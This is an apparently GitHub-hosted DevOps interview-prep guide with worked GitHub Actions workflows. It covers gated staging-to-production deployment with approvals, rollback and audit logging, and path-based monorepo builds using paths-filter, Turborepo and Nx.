### Question 11: Design a deployment workflow with environment approvals, staging, and production rollbacks.

**Type:** Architecture | **Category:** Deployment Workflows

## The Scenario

Your deployment process needs enterprise controls:

```
Requirements:
- Deploy to staging automatically on main branch push
- Require approval from 2 team leads for production
- Run smoke tests before promoting to production
- Enable one-click rollback to any previous version
- Track who deployed what and when
- Prevent deployments during maintenance windows
```

## The Challenge

Design a comprehensive deployment workflow with proper environment gates, approvals, rollback capabilities, and audit trails.


> **Common Mistake:** A junior engineer might deploy directly to production without gates, use manual kubectl commands for rollback, or skip staging entirely for hot fixes. These approaches risk production outages, make rollbacks error-prone, and bypass safety checks.

> **Senior Engineer Approach:** A senior engineer implements GitHub Environments with protection rules, uses deployment_status events for orchestration, builds automated rollback mechanisms, and creates comprehensive audit logging.

### Step 1: Configure GitHub Environments

```yaml
# Configure in Repository Settings > Environments

# staging:
#   - No required reviewers
#   - Deployment branches: main

# production:
#   - Required reviewers: 2 from @org/release-managers
#   - Wait timer: 5 minutes
#   - Deployment branches: main only
#   - Environment secrets: PROD_* credentials
```

### Step 2: Multi-Stage Deployment Workflow

```yaml
name: Deploy

on:
  push:
    branches: [main]
  workflow_dispatch:
    inputs:
      environment:
        description: 'Target environment'
        required: true
        type: choice
        options:
          - staging
          - production
      version:
        description: 'Version to deploy (for rollback)'
        required: false
        type: string

permissions:
  contents: read
  id-token: write
  deployments: write

jobs:
  build:
    runs-on: ubuntu-latest
    outputs:
      image: ${{ steps.build.outputs.image }}
      version: ${{ steps.version.outputs.version }}
    steps:
      - uses: actions/checkout@v4

      - name: Generate version
        id: version
        run: |
          VERSION="${{ inputs.version || github.sha }}"
          echo "version=$VERSION" >> $GITHUB_OUTPUT

      - name: Build and push
        id: build
        run: |
          IMAGE="ghcr.io/${{ github.repository }}:${{ steps.version.outputs.version }}"
          docker build -t $IMAGE .
          docker push $IMAGE
          echo "image=$IMAGE" >> $GITHUB_OUTPUT

  deploy-staging:
    needs: build
    if: github.event_name == 'push' || inputs.environment == 'staging'
    runs-on: ubuntu-latest
    environment:
      name: staging
      url: https://staging.app.example.com

    steps:
      - uses: actions/checkout@v4

      - name: Configure AWS
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: ${{ secrets.AWS_ROLE_ARN }}
          aws-region: us-east-1

      - name: Deploy to staging
        id: deploy
        run: |
          aws eks update-kubeconfig --name staging-cluster
          kubectl set image deployment/app app=${{ needs.build.outputs.image }} -n app
          kubectl rollout status deployment/app -n app --timeout=300s

      - name: Run smoke tests
        run: |
          # Wait for deployment to be ready
          sleep 30
          curl -sf https://staging.app.example.com/health || exit 1
          npm run test:smoke -- --env=staging

      - name: Record deployment
        if: always()
        run: |
          echo '{
            "environment": "staging",
            "version": "${{ needs.build.outputs.version }}",
            "image": "${{ needs.build.outputs.image }}",
            "status": "${{ job.status }}",
            "timestamp": "'$(date -u +%Y-%m-%dT%H:%M:%SZ)'",
            "actor": "${{ github.actor }}",
            "run_id": "${{ github.run_id }}"
          }' | tee deployment-record.json

          # Store in deployment history
          aws s3 cp deployment-record.json \
            s3://deployments-bucket/staging/${{ github.run_id }}.json

  deploy-production:
    needs: [build, deploy-staging]
    if: success() && (github.event_name == 'push' || inputs.environment == 'production')
    runs-on: ubuntu-latest
    environment:
      name: production
      url: https://app.example.com

    steps:
      - uses: actions/checkout@v4

      - name: Configure AWS
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: ${{ secrets.AWS_ROLE_ARN_PROD }}
          aws-region: us-east-1

      - name: Pre-deployment checks
        run: |
          # Check maintenance window
          HOUR=$(date +%H)
          DAY=$(date +%u)
          if [[ $HOUR -ge 22 || $HOUR -lt 6 ]] && [[ $DAY -le 5 ]]; then
            echo "::error::Deployments blocked during maintenance window (10PM-6AM weekdays)"
            exit 1
          fi

          # Check for active incidents
          curl -sf https://status.example.com/api/incidents/active | jq -e '.count == 0' || {
            echo "::error::Cannot deploy during active incident"
            exit 1
          }

      - name: Deploy to production
        run: |
          aws eks update-kubeconfig --name production-cluster

          # Record pre-deployment state for rollback
          kubectl get deployment/app -n app -o json > pre-deploy-state.json

          # Deploy with canary strategy
          kubectl set image deployment/app app=${{ needs.build.outputs.image }} -n app
          kubectl rollout status deployment/app -n app --timeout=600s

      - name: Post-deployment verification
        run: |
          # Health check
          for i in {1..5}; do
            curl -sf https://app.example.com/health && break
            sleep 10
          done

          # Smoke tests
          npm run test:smoke -- --env=production

      - name: Record successful deployment
        run: |
          echo '{
            "environment": "production",
            "version": "${{ needs.build.outputs.version }}",
            "image": "${{ needs.build.outputs.image }}",
            "status": "success",
            "timestamp": "'$(date -u +%Y-%m-%dT%H:%M:%SZ)'",
            "actor": "${{ github.actor }}",
            "approvers": "${{ github.event.review.user.login || 'auto' }}",
            "run_id": "${{ github.run_id }}"
          }' | aws s3 cp - s3://deployments-bucket/production/${{ github.run_id }}.json
```

### Step 3: Rollback Workflow

```yaml
name: Rollback

on:
  workflow_dispatch:
    inputs:
      environment:
        description: 'Environment to rollback'
        required: true
        type: choice
        options:
          - staging
          - production
      target_version:
        description: 'Version to rollback to (leave empty for previous)'
        required: false
        type: string
      reason:
        description: 'Reason for rollback'
        required: true
        type: string

permissions:
  contents: read
  id-token: write
  deployments: write

jobs:
  rollback:
    runs-on: ubuntu-latest
    environment: ${{ inputs.environment }}

    steps:
      - name: Configure AWS
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: ${{ secrets.AWS_ROLE_ARN }}
          aws-region: us-east-1

      - name: Determine rollback target
        id: target
        run: |
          if [ -n "${{ inputs.target_version }}" ]; then
            echo "version=${{ inputs.target_version }}" >> $GITHUB_OUTPUT
          else
            # Get previous successful deployment
            PREV=$(aws s3 ls s3://deployments-bucket/${{ inputs.environment }}/ | \
              sort -r | head -2 | tail -1 | awk '{print $4}')
            VERSION=$(aws s3 cp s3://deployments-bucket/${{ inputs.environment }}/$PREV - | jq -r '.version')
            echo "version=$VERSION" >> $GITHUB_OUTPUT
          fi

      - name: Perform rollback
        run: |
          aws eks update-kubeconfig --name ${{ inputs.environment }}-cluster

          IMAGE="ghcr.io/${{ github.repository }}:${{ steps.target.outputs.version }}"
          kubectl set image deployment/app app=$IMAGE -n app
          kubectl rollout status deployment/app -n app --timeout=300s

      - name: Verify rollback
        run: |
          curl -sf https://${{ inputs.environment == 'production' && 'app' || 'staging.app' }}.example.com/health

      - name: Record rollback
        run: |
          echo '{
            "type": "rollback",
            "environment": "${{ inputs.environment }}",
            "from_version": "current",
            "to_version": "${{ steps.target.outputs.version }}",
            "reason": "${{ inputs.reason }}",
            "actor": "${{ github.actor }}",
            "timestamp": "'$(date -u +%Y-%m-%dT%H:%M:%SZ)'"
          }' | aws s3 cp - s3://deployments-bucket/rollbacks/${{ github.run_id }}.json

      - name: Notify team
        uses: slackapi/slack-github-action@v1
        with:
          webhook: ${{ secrets.SLACK_WEBHOOK }}
          webhook-type: incoming-webhook
          payload: |
            {
              "text": "Rollback completed",
              "blocks": [
                {
                  "type": "section",
                  "text": {
                    "type": "mrkdwn",
                    "text": "*Rollback to ${{ inputs.environment }}*\nVersion: ${{ steps.target.outputs.version }}\nReason: ${{ inputs.reason }}\nBy: ${{ github.actor }}"
                  }
                }
              ]
            }
```

### Step 4: Blue-Green Deployment

```yaml
name: Blue-Green Deploy

on:
  workflow_dispatch:
    inputs:
      environment:
        type: choice
        options: [staging, production]

jobs:
  deploy:
    runs-on: ubuntu-latest
    environment: ${{ inputs.environment }}
    steps:
      - uses: actions/checkout@v4

      - name: Configure AWS
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: ${{ secrets.AWS_ROLE_ARN }}
          aws-region: us-east-1

      - name: Get current deployment color
        id: current
        run: |
          aws eks update-kubeconfig --name ${{ inputs.environment }}-cluster
          CURRENT=$(kubectl get service/app -n app -o jsonpath='{.spec.selector.color}')
          if [ "$CURRENT" == "blue" ]; then
            echo "current=blue" >> $GITHUB_OUTPUT
            echo "target=green" >> $GITHUB_OUTPUT
          else
            echo "current=green" >> $GITHUB_OUTPUT
            echo "target=blue" >> $GITHUB_OUTPUT
          fi

      - name: Deploy to inactive color
        run: |
          IMAGE="ghcr.io/${{ github.repository }}:${{ github.sha }}"
          kubectl set image deployment/app-${{ steps.current.outputs.target }} \
            app=$IMAGE -n app
          kubectl rollout status deployment/app-${{ steps.current.outputs.target }} \
            -n app --timeout=300s

      - name: Test inactive deployment
        run: |
          # Test the inactive deployment directly
          POD=$(kubectl get pod -n app -l color=${{ steps.current.outputs.target }} -o jsonpath='{.items[0].metadata.name}')
          kubectl port-forward $POD 8080:8080 -n app &
          sleep 5
          curl -sf http://localhost:8080/health

      - name: Switch traffic
        run: |
          kubectl patch service/app -n app \
            -p '{"spec":{"selector":{"color":"${{ steps.current.outputs.target }}"}}}'

      - name: Verify switch
        run: |
          sleep 10
          curl -sf https://app.example.com/health
          npm run test:smoke

      - name: Keep old deployment for quick rollback
        run: |
          echo "Previous deployment (${{ steps.current.outputs.current }}) kept for rollback"
          echo "To rollback, run: kubectl patch service/app -n app -p '{\"spec\":{\"selector\":{\"color\":\"${{ steps.current.outputs.current }}\"}}}'"
```

### Step 5: Deployment Dashboard Data

```yaml
name: Update Deployment Dashboard

on:
  deployment_status:

jobs:
  update-dashboard:
    runs-on: ubuntu-latest
    steps:
      - name: Update deployment metrics
        run: |
          # Send metrics to monitoring system
          curl -X POST https://metrics.example.com/deployments \
            -H "Content-Type: application/json" \
            -d '{
              "repository": "${{ github.repository }}",
              "environment": "${{ github.event.deployment.environment }}",
              "status": "${{ github.event.deployment_status.state }}",
              "sha": "${{ github.event.deployment.sha }}",
              "creator": "${{ github.event.deployment.creator.login }}",
              "timestamp": "${{ github.event.deployment_status.created_at }}"
            }'
```


## Deployment Pattern Comparison

| Pattern | Downtime | Rollback Speed | Resource Usage |
|---------|----------|----------------|----------------|
| Rolling | Zero | Minutes | 1x |
| Blue-Green | Zero | Seconds | 2x |
| Canary | Zero | Seconds | 1.1x |
| Recreate | Yes | Minutes | 1x |

---

### Question 12: Our monorepo builds everything on every change. Implement efficient path-based workflows.

**Type:** Practical | **Category:** Monorepo Workflows

## The Scenario

Your monorepo structure:

```
monorepo/
├── apps/
│   ├── web/           # React frontend
│   ├── api/           # Node.js backend
│   ├── admin/         # Admin dashboard
│   └── mobile/        # React Native app
├── packages/
│   ├── ui/            # Shared UI components
│   ├── utils/         # Shared utilities
│   └── config/        # Shared configurations
└── infrastructure/
    ├── terraform/
    └── k8s/
```

Current problem: Every commit triggers builds for ALL 7 packages, even when only one file changed. CI takes 45 minutes and wastes thousands of dollars monthly.

## The Challenge

Implement efficient path-based workflows that only build affected packages while correctly handling dependencies between packages.


### Step 1: Detect Changed Packages

```yaml
name: CI

on:
  push:
    branches: [main]
  pull_request:

jobs:
  detect-changes:
    runs-on: ubuntu-latest
    outputs:
      web: ${{ steps.changes.outputs.web }}
      api: ${{ steps.changes.outputs.api }}
      admin: ${{ steps.changes.outputs.admin }}
      ui: ${{ steps.changes.outputs.ui }}
      utils: ${{ steps.changes.outputs.utils }}
      matrix: ${{ steps.matrix.outputs.packages }}

    steps:
      - uses: actions/checkout@v4

      - uses: dorny/paths-filter@v2
        id: changes
        with:
          filters: |
            web:
              - 'apps/web/**'
              - 'packages/ui/**'
              - 'packages/utils/**'
              - 'packages/config/**'
            api:
              - 'apps/api/**'
              - 'packages/utils/**'
              - 'packages/config/**'
            admin:
              - 'apps/admin/**'
              - 'packages/ui/**'
              - 'packages/utils/**'
            ui:
              - 'packages/ui/**'
            utils:
              - 'packages/utils/**'

      - name: Build matrix
        id: matrix
        run: |
          PACKAGES=()
          if [ "${{ steps.changes.outputs.web }}" == "true" ]; then
            PACKAGES+=("web")
          fi
          if [ "${{ steps.changes.outputs.api }}" == "true" ]; then
            PACKAGES+=("api")
          fi
          if [ "${{ steps.changes.outputs.admin }}" == "true" ]; then
            PACKAGES+=("admin")
          fi
          if [ "${{ steps.changes.outputs.ui }}" == "true" ]; then
            PACKAGES+=("ui")
          fi
          if [ "${{ steps.changes.outputs.utils }}" == "true" ]; then
            PACKAGES+=("utils")
          fi

          # Convert to JSON array
          JSON=$(printf '%s\n' "${PACKAGES[@]}" | jq -R . | jq -s -c .)
          echo "packages=$JSON" >> $GITHUB_OUTPUT

  build:
    needs: detect-changes
    if: needs.detect-changes.outputs.matrix != '[]'
    runs-on: ubuntu-latest
    strategy:
      fail-fast: false
      matrix:
        package: ${{ fromJSON(needs.detect-changes.outputs.matrix) }}

    steps:
      - uses: actions/checkout@v4

      - uses: actions/setup-node@v4
        with:
          node-version: 18
          cache: 'npm'

      - name: Install dependencies
        run: npm ci

      - name: Build package
        run: npm run build --workspace=${{ matrix.package }}

      - name: Test package
        run: npm run test --workspace=${{ matrix.package }}
```

### Step 2: Using Turborepo for Smart Builds

```yaml
name: CI with Turborepo

on:
  push:
    branches: [main]
  pull_request:

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 2  # Need for turbo diff

      - uses: actions/setup-node@v4
        with:
          node-version: 18
          cache: 'npm'

      - name: Install dependencies
        run: npm ci

      # Turborepo remote cache
      - name: Setup Turborepo cache
        uses: actions/cache@v4
        with:
          path: .turbo
          key: turbo-${{ runner.os }}-${{ github.sha }}
          restore-keys: |
            turbo-${{ runner.os }}-

      # Build only affected packages
      - name: Build
        run: npx turbo run build --filter='...[origin/main]'
        env:
          TURBO_TOKEN: ${{ secrets.TURBO_TOKEN }}
          TURBO_TEAM: ${{ vars.TURBO_TEAM }}

      - name: Test
        run: npx turbo run test --filter='...[origin/main]'
```

```json
// turbo.json
{
  "$schema": "https://turbo.build/schema.json",
  "globalDependencies": ["**/.env.*local"],
  "pipeline": {
    "build": {
      "dependsOn": ["^build"],
      "outputs": ["dist/**", ".next/**"]
    },
    "test": {
      "dependsOn": ["build"],
      "outputs": []
    },
    "lint": {
      "outputs": []
    },
    "deploy": {
      "dependsOn": ["build", "test"],
      "outputs": []
    }
  }
}
```

### Step 3: Using Nx for Affected Detection

```yaml
name: CI with Nx

on:
  push:
    branches: [main]
  pull_request:

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0  # Full history for Nx

      - uses: actions/setup-node@v4
        with:
          node-version: 18
          cache: 'npm'

      - name: Install dependencies
        run: npm ci

      # Nx cloud for distributed caching
      - name: Setup Nx
        uses: nrwl/nx-set-shas@v4

      # Only run for affected projects
      - name: Build affected
        run: npx nx affected --target=build --base=$NX_BASE --head=$NX_HEAD

      - name: Test affected
        run: npx nx affected --target=test --base=$NX_BASE --head=$NX_HEAD

      - name: Lint affected
        run: npx nx affected --target=lint --base=$NX_BASE --head=$NX_HEAD
```

### Step 4: Deploy Only Affected Apps

```yaml
name: Deploy

on:
  push:
    branches: [main]

jobs:
  detect:
    runs-on: ubuntu-latest
    outputs:
      apps: ${{ steps.detect.outputs.apps }}
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 2

      - name: Detect affected apps
        id: detect
        run: |
          # Get changed files
          CHANGED=$(git diff --name-only HEAD~1)

          APPS=()

          # Check each app
          if echo "$CHANGED" | grep -qE "^apps/web/|^packages/"; then
            APPS+=("web")
          fi
          if echo "$CHANGED" | grep -qE "^apps/api/|^packages/utils/"; then
            APPS+=("api")
          fi
          if echo "$CHANGED" | grep -qE "^apps/admin/|^packages/"; then
            APPS+=("admin")
          fi

          JSON=$(printf '%s\n' "${APPS[@]}" | jq -R . | jq -s -c .)
          echo "apps=$JSON" >> $GITHUB_OUTPUT

  deploy:
    needs: detect
    if: needs.detect.outputs.apps != '[]'
    runs-on: ubuntu-latest
    strategy:
      matrix:
        app: ${{ fromJSON(needs.detect.outputs.apps) }}
    environment: production-${{ matrix.app }}

    steps:
      - uses: actions/checkout@v4

      - uses: actions/setup-node@v4
        with:
          node-version: 18
          cache: 'npm'

      - run: npm ci

      - name: Build ${{ matrix.app }}
        run: npm run build --workspace=apps/${{ matrix.app }}

      - name: Deploy ${{ matrix.app }}
        run: |
          case "${{ matrix.app }}" in
            web)
              npx vercel deploy --prod --token=${{ secrets.VERCEL_TOKEN }}
              ;;
            api)
              aws eks update-kubeconfig --name prod-cluster
              kubectl set image deployment/api api=ghcr.io/${{ github.repository }}/api:${{ github.sha }}
              ;;
            admin)
              aws s3 sync apps/admin/dist s3://admin-bucket --delete
              aws cloudfront create-invalidation --distribution-id ${{ secrets.CF_DIST_ID }} --paths "/*"
              ;;
          esac
```

### Step 5: Efficient Caching for Monorepos

```yaml
name: CI with Optimized Caching

on: [push, pull_request]

env:
  CACHE_VERSION: v1

jobs:
  install:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - uses: actions/setup-node@v4
        with:
          node-version: 18

      # Cache entire node_modules with workspace awareness
      - name: Cache node_modules
        uses: actions/cache@v4
        id: cache
        with:
          path: |
            node_modules
            apps/*/node_modules
            packages/*/node_modules
          key: ${{ env.CACHE_VERSION }}-modules-${{ runner.os }}-${{ hashFiles('**/package-lock.json') }}

      - name: Install dependencies
        if: steps.cache.outputs.cache-hit != 'true'
        run: npm ci

  build:
    needs: install
    runs-on: ubuntu-latest
    strategy:
      matrix:
        package: [ui, utils, config]
    steps:
      - uses: actions/checkout@v4

      - uses: actions/setup-node@v4
        with:
          node-version: 18

      # Restore cached node_modules
      - uses: actions/cache@v4
        with:
          path: |
            node_modules
            apps/*/node_modules
            packages/*/node_modules
          key: ${{ env.CACHE_VERSION }}-modules-${{ runner.os }}-${{ hashFiles('**/package-lock.json') }}

      # Cache build outputs per package
      - uses: actions/cache@v4
        with:
          path: packages/${{ matrix.package }}/dist
          key: build-${{ matrix.package }}-${{ hashFiles(format('packages/{0}/**', matrix.package)) }}

      - name: Build ${{ matrix.package }}
        run: npm run build --workspace=packages/${{ matrix.package }}

  apps:
    needs: build
    runs-on: ubuntu-latest
    strategy:
      matrix:
        app: [web, api, admin]
    steps:
      - uses: actions/checkout@v4

      - uses: actions/setup-node@v4
        with:
          node-version: 18

      - uses: actions/cache@v4
        with:
          path: |
            node_modules
            apps/*/node_modules
            packages/*/node_modules
          key: ${{ env.CACHE_VERSION }}-modules-${{ runner.os }}-${{ hashFiles('**/package-lock.json') }}

      # Restore built packages
      - uses: actions/cache@v4
        with:
          path: packages/*/dist
          key: build-packages-${{ github.sha }}
          restore-keys: |
            build-packages-

      - name: Build ${{ matrix.app }}
        run: npm run build --workspace=apps/${{ matrix.app }}

      - name: Test ${{ matrix.app }}
        run: npm run test --workspace=apps/${{ matrix.app }}
```

### Step 6: Complete Monorepo Workflow

```yaml
name: Monorepo CI/CD

on:
  push:
    branches: [main, develop]
  pull_request:

concurrency:
  group: ${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: true

jobs:
  analyze:
    runs-on: ubuntu-latest
    outputs:
      packages: ${{ steps.affected.outputs.packages }}
      apps: ${{ steps.affected.outputs.apps }}
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0

      - uses: actions/setup-node@v4
        with:
          node-version: 18
          cache: 'npm'

      - run: npm ci

      - name: Get affected
        id: affected
        run: |
          # Using Nx to detect affected
          PACKAGES=$(npx nx show projects --affected --type=lib | jq -R -s -c 'split("\n")[:-1]')
          APPS=$(npx nx show projects --affected --type=app | jq -R -s -c 'split("\n")[:-1]')

          echo "packages=$PACKAGES" >> $GITHUB_OUTPUT
          echo "apps=$APPS" >> $GITHUB_OUTPUT

  lint:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: 18
          cache: 'npm'
      - run: npm ci
      - run: npx nx affected --target=lint

  test-packages:
    needs: analyze
    if: needs.analyze.outputs.packages != '[]'
    runs-on: ubuntu-latest
    strategy:
      matrix:
        package: ${{ fromJSON(needs.analyze.outputs.packages) }}
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: 18
          cache: 'npm'
      - run: npm ci
      - run: npx nx test ${{ matrix.package }}

  build-apps:
    needs: [analyze, test-packages]
    if: always() && needs.analyze.outputs.apps != '[]'
    runs-on: ubuntu-latest
    strategy:
      matrix:
        app: ${{ fromJSON(needs.analyze.outputs.apps) }}
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: 18
          cache: 'npm'
      - run: npm ci
      - run: npx nx build ${{ matrix.app }}
      - uses: actions/upload-artifact@v4
        with:
          name: ${{ matrix.app }}-build
          path: apps/${{ matrix.app }}/dist

  deploy:
    needs: build-apps
    if: github.ref == 'refs/heads/main'
    runs-on: ubuntu-latest
    strategy:
      matrix:
        app: ${{ fromJSON(needs.analyze.outputs.apps) }}
    environment: production-${{ matrix.app }}
    steps:
      - uses: actions/download-artifact@v4
        with:
          name: ${{ matrix.app }}-build
      - name: Deploy ${{ matrix.app }}
        run: echo "Deploying ${{ matrix.app }}"
```


## Monorepo Tool Comparison

| Tool | Affected Detection | Remote Cache | Learning Curve |
|------|-------------------|--------------|----------------|
| Turborepo | Via git diff | Vercel/custom | Low |
| Nx | Built-in graph | Nx Cloud/custom | Medium |
| Lerna | Limited | No | Low |
| Manual | paths-filter | GitHub Cache | Low |

<InterviewQuiz
  question="In a monorepo, why should path filters for an app include its dependent packages, not just the app directory?"
  options={[
    "To make the workflow file longer",
    "Because GitHub requires it",
    "Because changes to shared packages can break apps that depend on them, even if the app's own code hasn't changed",
    "To trigger more builds for better test coverage"
  ]}
  correctAnswer={2}
  explanation="In a monorepo, packages often depend on shared libraries. If you only filter on 'apps/web/**', changes to 'packages/ui/**' (which web depends on) won't trigger a web build. This could result in deploying an app that's incompatible with the latest shared package. Path filters must include all transitive dependencies to ensure changes that could affect an app always trigger its CI pipeline."
/>

---

## Practice with Real Infrastructure

Reading questions is good. **Deploying real projects is better.**

These interview questions teach you the concepts. To truly master them, you need hands-on practice with real cloud infrastructure.

**[Try DeployU Free](https://deployu.ai?ref=github)** - Deploy Docker containers, Kubernetes clusters, and cloud applications on real AWS/Azure/GCP infrastructure. No credit card required.

---

*Found this helpful? [Star the repo](https://github.com/gsraju27/ai-cloud-devops-roadmap) to support the project!*
